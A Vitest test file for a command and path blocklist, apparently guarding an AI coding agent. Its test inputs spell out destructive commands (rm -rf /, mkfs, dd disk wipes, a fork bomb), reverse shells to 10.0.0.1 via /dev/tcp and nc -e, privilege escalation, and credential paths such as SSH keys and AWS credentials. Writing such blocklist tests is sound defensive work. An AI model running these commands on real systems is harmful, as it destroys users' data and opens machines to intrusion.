import { describe, it, expect } from "vitest";
import { isBlockedCommand, isBlockedWritePath, isBlockedReadPath } from "../../src/safety/blocklist.js";

describe("isBlockedCommand", () => {
  it("blocks rm -rf /", () => {
    expect(isBlockedCommand("rm -rf /")).toMatchObject({ blocked: true, category: "destructive_fs" });
    expect(isBlockedCommand("rm -fr /etc")).toMatchObject({ blocked: true });
  });

  it("blocks mkfs", () => {
    expect(isBlockedCommand("mkfs.ext4 /dev/sda1")).toMatchObject({ blocked: true, category: "disk_wipe" });
  });

  it("blocks dd with /dev/zero", () => {
    expect(isBlockedCommand("dd if=/dev/zero of=/dev/sda")).toMatchObject({ blocked: true, category: "disk_wipe" });
  });

  it("blocks fork bombs", () => {
    expect(isBlockedCommand(":(){ :|:& };:")).toMatchObject({ blocked: true, category: "fork_bomb" });
  });

  it("blocks privilege escalation", () => {
    expect(isBlockedCommand("sudo -i bash")).toMatchObject({ blocked: true, category: "privilege_escalation" });
    expect(isBlockedCommand("chmod 777 /")).toMatchObject({ blocked: true });
  });

  it("blocks reverse shells", () => {
    expect(isBlockedCommand("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")).toMatchObject({ blocked: true, category: "reverse_shell" });
    expect(isBlockedCommand("nc -e /bin/bash 10.0.0.1 4444")).toMatchObject({ blocked: true });
  });

  it("blocks git push --force without --force-with-lease", () => {
    expect(isBlockedCommand("git push origin main --force")).toMatchObject({ blocked: true, category: "forced_push" });
    expect(isBlockedCommand("git push -f origin main")).toMatchObject({ blocked: true });
  });

  it("allows git push --force-with-lease", () => {
    expect(isBlockedCommand("git push origin main --force-with-lease")).toMatchObject({ blocked: false });
  });

  it("allows safe commands", () => {
    expect(isBlockedCommand("ls -la")).toMatchObject({ blocked: false });
    expect(isBlockedCommand("git status")).toMatchObject({ blocked: false });
    expect(isBlockedCommand("cat README.md")).toMatchObject({ blocked: false });
    expect(isBlockedCommand("npm install")).toMatchObject({ blocked: false });
  });

  it("blocks SSH private key writes", () => {
    expect(isBlockedCommand("> ~/.ssh/id_rsa")).toMatchObject({ blocked: true, category: "credential_file_write" });
  });
});

describe("isBlockedWritePath", () => {
  it("blocks /etc writes", () => {
    expect(isBlockedWritePath("/etc/passwd")).toMatchObject({ blocked: true });
    expect(isBlockedWritePath("/etc/hosts")).toMatchObject({ blocked: true });
  });

  it("blocks /sys and /proc writes", () => {
    expect(isBlockedWritePath("/sys/kernel/mm/transparent_hugepage")).toMatchObject({ blocked: true });
    expect(isBlockedWritePath("/proc/sys/kernel/dmesg_restrict")).toMatchObject({ blocked: true });
  });

  it("blocks SSH private key paths", () => {
    expect(isBlockedWritePath("/home/user/.ssh/id_rsa")).toMatchObject({ blocked: true });
    expect(isBlockedWritePath("/home/user/.ssh/id_ed25519")).toMatchObject({ blocked: true });
  });

  it("blocks AWS credentials", () => {
    expect(isBlockedWritePath("/home/user/.aws/credentials")).toMatchObject({ blocked: true });
  });

  it("allows normal project paths", () => {
    expect(isBlockedWritePath("/home/user/projects/foo/src/index.ts")).toMatchObject({ blocked: false });
    expect(isBlockedWritePath("./src/components/App.tsx")).toMatchObject({ blocked: false });
  });
});

describe("isBlockedReadPath", () => {
  it("blocks /sys reads", () => {
    expect(isBlockedReadPath("/sys/kernel")).toMatchObject({ blocked: true });
  });

  it("blocks /proc reads", () => {
    expect(isBlockedReadPath("/proc/1/environ")).toMatchObject({ blocked: true });
  });

  it("allows /etc reads (read-only sensitive but allowed)", () => {
    expect(isBlockedReadPath("/etc/hosts")).toMatchObject({ blocked: false });
  });

  it("allows normal file reads", () => {
    expect(isBlockedReadPath("/home/user/README.md")).toMatchObject({ blocked: false });
  });
});
